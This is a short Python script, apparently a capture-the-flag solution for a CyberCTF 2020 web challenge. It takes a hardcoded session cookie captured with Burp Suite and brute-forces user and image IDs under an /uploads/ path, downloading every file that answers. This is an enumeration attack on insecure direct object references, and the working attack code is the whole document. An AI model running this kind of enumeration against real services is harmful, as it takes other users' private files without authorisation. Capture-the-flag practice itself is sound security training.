import requests


burp0_cookies = {"session": ".eJwlzj0OwjAMQOG7eGaIf2I7vUyVxI5gbemEuDuVmN8bvg_s68jzCdv7uPIB-ytggxlN3FtdLXW4Ia1ZR1FaQ00EZRH7yhRFnirWtMUy7jiMMMR76W16n5MYhUv3u7r5HMaUOUpiBFf0VA4WjXBFo1pE-d6bBtyQ68zjr6kVvj-5xi51.XxyptA.ERtfI7PQVc8HeYMaWr7cSD7b3oQ"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}

i = 0

for i in range(1,786):
	for u in range(1,649):
		burp0_url = "http://codeshot-cybrics2020.ctf.su:80/uploads/%s/%s" % (u,i) 
		r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

		if r.status_code == 200:
			print("[+] User, image :",u,",",i)
			with open("./img/%s_%s.png" % (u,i),'wb') as f:
				f.write(r.content)
			break
	